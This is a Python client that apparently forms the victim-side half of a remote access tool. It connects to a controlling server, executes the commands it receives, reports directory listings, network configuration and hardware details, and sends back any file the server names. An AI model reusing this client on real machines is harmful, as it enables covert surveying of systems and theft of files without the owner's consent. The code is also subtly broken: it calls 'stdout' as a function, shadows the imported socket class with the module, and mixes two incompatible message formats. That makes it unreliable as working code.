from __future__ import annotations
from protocol import PacketType, send_packet, recv_packet
from socket import create_connection, socket
from typing import Final
from pathlib import Path
import subprocess
import platform
import cpuinfo
import zipfile
import GPUtil
import psutil
import socket
import os

class Client:
    BUFFER_SIZE: Final[int] = 1024

    def __init__(self, host: str = "localhost", port: int = 8080) -> None:
        self.host = host
        self.port = port
        self.socket: socket | None = None

    def start(self) -> None:
        with create_connection((self.host, self.port)) as self.socket:
            while True:
                data = self.socket.recv(self.BUFFER_SIZE)

                if not data:
                    break

                command = data.decode().strip()
                self.handle_command(command)

    def handle_command(self, command: str) -> None:
        parts = command.split(maxsplit=1)

        match parts:
            case ["view_cwd"]: 
                self.send(os.getcwd())

            case ["dir"]:
                files = "\n".join(sorted(os.listdir()))
                self.send(files)

            case ["cd", path]:
                try:
                    os.chdir(path)
                    self.send(f"Changed directory to: {os.getcwd()}")
                except FileNotFoundError:
                    self.send("Directory not found")
                except NotADirectoryError:
                    self.send("Not a directory")

            case ["ipconfig"]:
                self.send(self.ip())

            case ["systeminfo"]:
                self.send(self.systeminfo())

            case ["specs"]:
                self.send(self.specs())

            case ["download", filename]:
                self.send_file(filename)

            case _:
                self.send("Unknown command")

    def systeminfo(self) -> str:
        result = subprocess.run(
            ["systeminfo"],
            capture_output=True,
            text=True
        )

        return result.stdout()

    def specs(self) -> str:
        cpu = cpuinfo.get_cpu_info().get(
            "brand_raw",
            "Unknown"
        )

        ram_gb = round(
            psutil.virtual_memory().total / (1024 ** 3),
            2
        )

        disk_gb = round(
            psutil.disk_usage("/").total / (1024 ** 3),
            2
        )

        gpus = GPUtil.getGPUs()

        if gpus:
            gpu_info = "\n".join(
                [
                    f"{gpu.name} "
                    f"({gpu.memoryTotal:.0f} MB VRAM)"
                    for gpu in gpus
                ]
            )
        else:
            gpu_info = "No GPU detected"

        return (
            f"CPU: {cpu}\n"
            f"GPU: {gpu_info}\n"
            f"Cores: {psutil.cpu_count(logical=False)} physical / "
            f"{psutil.cpu_count(logical=True)} logical\n"
            f"RAM: {ram_gb} GB\n"
            f"Disk: {disk_gb} GB\n"
            f"OS: {platform.system()} {platform.release()}\n"
            f"Architecture: {platform.machine()}"
        )

    def send_file(self, filename: str) -> None:
        path = Path(filename)

        if not path.exists():
            send_packet(
                self.socket,
                PacketType.ERROR,
                "File not found"
            )
            return

        with open(path, "rb") as file:
            data = file.read()

        send_packet(
            self.socket,
            PacketType.FILE,
            data
        )

    def ip(self) -> str:
        result = subprocess.run(
            ["ipconfig", "/all"],
            capture_output=True,
            text=True
        )

        return result.stdout

    def send(self, message: str) -> None:
        if self.socket is not None:
            self.socket.sendall(
                message.encode() + b"<END>"
            )

def main() -> None:
    Client(host="127.0.0.1").start()

if __name__ == "__main__":
    main()
